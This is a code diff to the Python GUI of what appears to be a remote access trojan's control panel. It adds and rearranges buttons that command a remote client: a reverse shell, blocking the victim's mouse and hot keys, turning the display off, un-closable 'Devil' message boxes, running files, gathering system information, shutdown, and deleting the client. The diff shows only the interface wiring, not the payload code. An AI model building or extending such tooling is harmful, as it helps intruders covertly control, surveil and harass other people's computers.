@@ -15,7 +15,6 @@ class FunctionApp(ctk.CTk):
         self.comm = CommandFunction(self.server)
         self.create_func_app()
 
-        #self.comm.download_file(ip, port, 'playit.txt') - скачивание файла
     
     def create_func_app(self):
         self.gbw_func_frame = ctk.CTkFrame(self, width=600, height=60, fg_color='#4B0082')
@@ -36,50 +35,75 @@ class FunctionApp(ctk.CTk):
     def add_content_to_tabs(self):
         self.fun_tab = self.tabview.tab("Fun")
 
-        self.input_link = ctk.CTkEntry(self.fun_tab, width=300, height=40, placeholder_text='Enter link', font=('Bold', 20), text_color='green')
+        self.input_link = ctk.CTkEntry(self.fun_tab, width=300, height=40, placeholder_text='Enter a link', font=('Bold', 20), text_color='green')
 
-        self.open_link_btn = ctk.CTkButton(self.fun_tab, text="Open link", height=50, width=200,
-                                           command=lambda: self.comm.open_link(self.ip, self.port, self.input_link.get()), font=('Bold', 15), fg_color='#9370DB')
+        self.open_link_btn = ctk.CTkButton(self.fun_tab, text="Open Link", height=50, width=200,
+                                           command=lambda: self.comm.open_link(self.ip, self.port, self.input_link.get()), font=('Bold', 15),
+                                             fg_color='#4B0082')
         
-        self.blockinput_btn = ctk.CTkButton(self.fun_tab, text='Block keyboard', height=50, width=200,
+        self.blockinput_btn = ctk.CTkButton(self.fun_tab, text='Block Hot Keys/mouse', height=50, width=200,
                                 command=lambda: self.comm.block_input(self.ip, self.port), font=('Bold', 15), fg_color='#9370DB')
         
-        self.off_monitor_btn = ctk.CTkButton(self.fun_tab, text="Display off", height=50, width=100,
-                                           command=lambda: self.comm.post_msg(self.ip, self.port, "display_black"), font=('Bold', 15), fg_color='#9370DB')
+        self.off_monitor_btn = ctk.CTkButton(self.fun_tab, text="Display Off", height=50, width=100,
+                                           command=lambda: self.comm.display_controll(self.ip, self.port), font=('Bold', 15), fg_color='black')
         
-        self.on_monitor_btn = ctk.CTkButton(self.fun_tab, text="Display on", height=50, width=95,
-                                           command=lambda: self.comm.post_msg(self.ip, self.port, "display_white"), font=('Bold', 15), fg_color='#9370DB')
+        self.on_monitor_btn = ctk.CTkButton(self.fun_tab, text="Display On", height=50, width=95, text_color="black",
+                                           command=lambda: self.comm.display_controll(self.ip, self.port, True), font=('Bold', 15), fg_color='white')
+        
+        self.set_wallppr_btn = ctk.CTkButton(self.fun_tab, text="Set Wallpaper", height=50, width=200,
+                                           command=lambda: self.comm.set_wallpaper(self.ip, self.port), font=('Bold', 15), fg_color='#9370DB')
+        
+        self.input_msg_box = ctk.CTkEntry(self.fun_tab, width=300, height=40, placeholder_text='Enter a message', font=('Bold', 20), text_color='green')
+
+        self.send_msg_btn = ctk.CTkButton(self.fun_tab, text="Send\nMsg Box", height=50, width=100,
+                                           command=lambda: self.comm.msg_box(self.ip, self.port, self.input_msg_box.get()),
+                                             font=('Bold', 15), fg_color='#4B0082')
+        
+        self.send_devilmsg_btn = ctk.CTkButton(self.fun_tab, text="Devil/Msg\n!No Close!", height=50, width=95,
+                                           command=lambda: self.comm.msg_box(self.ip, self.port, self.input_msg_box.get(), True),
+                                             font=('Bold', 15), fg_color='red')
+        
         
         self.blockinput_btn.place(x=10, y=70)
         self.input_link.place(x=10, y=10)
         self.open_link_btn.place(x=330, y=7)
         self.off_monitor_btn.place(x=330, y=70)
         self.on_monitor_btn.place(x=435, y=70)
+        self.set_wallppr_btn.place(x=10, y=140)
+        self.input_msg_box.place(x=10, y=202)
+        self.send_msg_btn.place(x=330, y=200)
+        self.send_devilmsg_btn.place(x=435, y=200)
 
 
         self.sys_tab = self.tabview.tab("System")
         self.console_btn = ctk.CTkButton(self.sys_tab, text='Reverse Shell', height=50, width=200,
                                 command=lambda: self.comm.console(self.ip, self.port), font=('Bold', 15), fg_color='#9370DB')
         
-        self.off_btn = ctk.CTkButton(self.sys_tab, text='Off pc', height=50, width=200,
-                                command=lambda: self.comm.off_pc(self.ip, self.port), font=('Bold', 15), fg_color='#9370DB')
+        self.off_btn = ctk.CTkButton(self.sys_tab, text='Off Pc', height=50, width=95,
+                                command=lambda: self.comm.off_pc(self.ip, self.port), font=('Bold', 15), fg_color='black')
         
-        self.reboot_btn = ctk.CTkButton(self.sys_tab, text='Reboot pc', height=50, width=200,
-                                command=lambda: self.comm.off_pc(self.ip, self.port, True), font=('Bold', 15), fg_color='#9370DB')
+        self.reboot_btn = ctk.CTkButton(self.sys_tab, text='Reboot Pc', height=50, width=100,
+                                command=lambda: self.comm.off_pc(self.ip, self.port, True), font=('Bold', 15), fg_color='grey')
         
-        self.remote_btn = ctk.CTkButton(self.sys_tab, text='Remote tool', height=50, width=200,
+        self.remote_btn = ctk.CTkButton(self.sys_tab, text='Remote Tool', height=50, width=200,
                                 command=lambda: self.comm.remote_tool(self.ip, self.port), font=('Bold', 15), fg_color='#9370DB')
         
-        self.ping_btn = ctk.CTkButton(self.sys_tab, text='CLIENT OFF', height=50, width=500, fg_color='yellow', 
-                                       command=lambda: self.comm.post_msg(self.ip, self.port, "exit"), font=('Bold', 20))
+        self.kill_btn = ctk.CTkButton(self.sys_tab, text='! DELETE CLIENT !', height=50, width=500, fg_color='red', text_color="yellow", 
+                                       command=lambda: self.comm.killer(self.ip, self.port, True), font=('Bold', 20))
+
+        self.disconnect_btn = ctk.CTkButton(self.sys_tab, text='CLIENT OFF', height=50, width=500, fg_color='yellow', text_color="red", 
+                                       command=lambda: self.comm.killer(self.ip, self.port), font=('Bold', 20))
         
-        self.ping_btn.pack(side='bottom', pady=20, padx=20)
-        self.console_btn.pack(side='top', pady=10, padx=50)
-        self.remote_btn.pack(side='top', pady=10, padx=50)
+        self.off_btn.place(x=330, y=70)
+        self.reboot_btn.place(x=430, y=70)
+        self.kill_btn.pack(side='bottom', pady=10, padx=10)
+        self.disconnect_btn.pack(side='bottom', pady=10, padx=10)
+        self.console_btn.place(x=10, y=10)
+        self.remote_btn.place(x=330, y=10)
         
 
         self.file_tab = self.tabview.tab("Files")
-        self.send_and_run_btn = ctk.CTkButton(self.file_tab, text='Send and run', height=50, width=200,
+        self.send_and_run_btn = ctk.CTkButton(self.file_tab, text='Run File From Disk', height=50, width=200,
                                        command=lambda: self.comm.send_and_run(self.ip, self.port), font=('Bold', 15), fg_color='#9370DB')
         
         self.send_file_btn = ctk.CTkButton(self.file_tab, text='Sendfile', height=50, width=200,
@@ -90,7 +114,7 @@ class FunctionApp(ctk.CTk):
         
 
         self.info_tab = self.tabview.tab("Info")
-        self.get_info_btn = ctk.CTkButton(self.info_tab, text='Get info', height=50, width=200,
+        self.get_info_btn = ctk.CTkButton(self.info_tab, text='Get Info', height=50, width=200,
                                        command=lambda: self.comm.get_info(self.ip, self.port), font=('Bold', 15), fg_color='#9370DB')
         
         self.get_info_btn.pack(side='top', pady=10, padx=50)
